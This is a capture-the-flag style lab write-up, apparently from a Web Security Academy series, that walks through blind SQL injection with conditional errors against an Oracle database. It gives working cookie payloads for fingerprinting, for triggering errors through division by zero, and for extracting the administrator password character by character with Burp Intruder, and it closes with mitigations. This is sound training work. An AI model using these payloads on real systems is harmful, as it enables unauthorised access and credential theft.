# Blind SQL Injection with Conditional Errors

## Goal:
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

---

## Vulnerability Analysis

### Attack Vector Identification
- **Entry Point**: `TrackingId` cookie parameter
- **Vulnerability Type**: T1190.001 - SQL Injection: Blind Conditional Error (CWE-89)
- **Security Flaws:**
    - User input is embedded directly into SQL queries
    - Application responds differently based on SQL error conditions

### Vulnerability Assessment & Exploitation

**Initial Approach:**
- Intercepted HTTP requests using Burp Suite
- Identified tracking cookie as potential injection point
- Performed systematic input validation testing
- Analyzed application response patterns to determine database type

**Step 1: Identifying Database Type**

Injected a single quote:
```sql
'
```
Response: HTTP/2 500 Internal Server Error

This indicates the input is being interpreted as part of a SQL string literal. The error confirms that SQL can be injected and the input reaches the database layer.

Injected escaped quote:
```sql
''
```
Response: HTTP/2 200 OK

This properly closes the string literal, indicating string-based injection is possible.

**Testing MSSQL-specific syntax:**
```sql
' AND SELECT '1'='1
```
Response: HTTP/2 500 Internal Server Error

```sql
' AND (SELECT 1) = 1 --
```
Response: HTTP/2 500 Internal Server Error

Since this syntax is specific to MSSQL and both payloads produce a 500 error, the database is likely not MSSQL.

**Testing Oracle-specific syntax:**
```sql
'||(SELECT'')||'
```
Response: HTTP/2 500 Internal Server Error

```sql
'||(SELECT''FROM dual)||'
```
Response: HTTP/2 200 OK

This strongly indicates the target is using an Oracle database. Oracle requires a `FROM` clause even for selecting constant values, and `DUAL` is a special one-row dummy table that Oracle provides for such cases.

**Step 2: Verifying Users Table**

```sql
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
Response: HTTP/2 200 OK

This confirms the existence of a `users` table in the database.

**Note:** `'||(SELECT '' FROM users)||'` will throw an error because it returns multiple rows, which is invalid in a **scalar subquery context** (where only a single value is expected). Oracle will return an `ORA-01427: single-row subquery returns more than one row` error.

**Step 3: Testing Conditional Errors**

Verified conditional error functionality:
```sql
'||(SELECT CASE WHEN '1'='1' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
```
Response: HTTP/2 500 Internal Server Error

```sql
'||(SELECT CASE WHEN '1'='2' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
```
Response: HTTP/2 200 OK

This confirms that conditional errors can be used to extract information. When the condition is true, `TO_CHAR(1/0)` forces a division-by-zero error.

**Step 4: Verifying Administrator Username**

```sql
'||(SELECT CASE WHEN '1'='1' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Response: HTTP/2 500 Internal Server Error

```sql
'||(SELECT CASE WHEN '1'='2' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Response: HTTP/2 200 OK

A 500 error when the condition is true confirms that a user with the username 'administrator' exists.

**Explanation:**
`SELECT ... FROM users WHERE username='administrator'`
This part is executed first: it filters the `users` table down to just rows where `username = 'administrator'`.
- If no such row exists, the query returns nothing, and the rest doesn't matter.
- If the user does exist, Oracle moves on to evaluate the `CASE` for that row.

`CASE WHEN '1'='1' THEN TO_CHAR(1/0) ELSE '' END`
This is a conditional expression, similar to an `if-else`:

Oracle checks: is `'1' = '1'`?
Yes, it is → so it chooses the `THEN` branch
It will evaluate: `TO_CHAR(1/0)` → this triggers division by zero → throws error
If the condition had been false (`'1'='2'`), Oracle would evaluate the `ELSE` part: `''`, and no error would occur.

**Step 5: Determining Password Length**

```sql
'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Response: HTTP/2 500 Internal Server Error

```sql
'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Response: HTTP/2 200 OK

This confirms the password is exactly 20 characters long.

**Step 6: Extracting Password Using Intruder**

```sql
'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Configured Burp Intruder with:
- Payload type: Simple list
- Payload set: a-z and 0-9
- Filter: Only 5xx server error responses

![burpsuite response](./misc-images/10-1.png)

This returned only one character `r`, indicating that `r` is the first character of the password.

Repeated the process for all 20 characters to retrieve the complete password.

**Alternative Method - Cluster Bomb Attack:**
```sql
'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- Payload for position (§1§): 1-20
- Payload for character (§a§): a-z and 0-9
- Filter: Only 5xx server error responses

Logged in as the administrator using the password retrieved.

---

## Security Assessment

### Root Cause Analysis
- Application concatenates user input directly into SQL queries
- No input validation or sanitization implemented
- Application responds differently based on SQL error conditions
- Parameterized queries (prepared statements) are not used

### Risk Assessment
| Category | Impact |
|----------|--------|
| Confidentiality | High – Sensitive user data exposed |
| Authentication | High – Credentials leaked character-by-character |
| Information Disclosure | Medium – Database structure partially revealed |

---

## Mitigation

- Use parameterized queries (prepared statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.

Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/09-blind-sqli-conditional-responses.md#mitigation)

- Restrict database permissions using the principle of least privilege.

- Implement consistent error handling that does not reveal information about database structure or query execution.

---

## Reflection

This lab demonstrated how blind SQL injection with conditional errors can be used to extract sensitive data both character-by-character and bulk extraction methods through systematic testing. The Oracle-specific `CASE WHEN` technique proved highly effective in forcing database errors that reveal information based on boolean conditions. Learned the importance of database fingerprinting and understanding specific database syntax for effective exploitation.

---

## Notes

- **Oracle Syntax**: `SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
- **Microsoft Syntax**: `SELECT CASE WHEN (CONDITION) THEN 1/0 ELSE NULL END`

Check SQLi Cheatsheet from Portswigger, [here](https://portswigger.net/web-security/sql-injection/cheat-sheet)

`||` in Oracle is the string concatenation operator. It forces the subquery to be evaluated as part of a string expression.
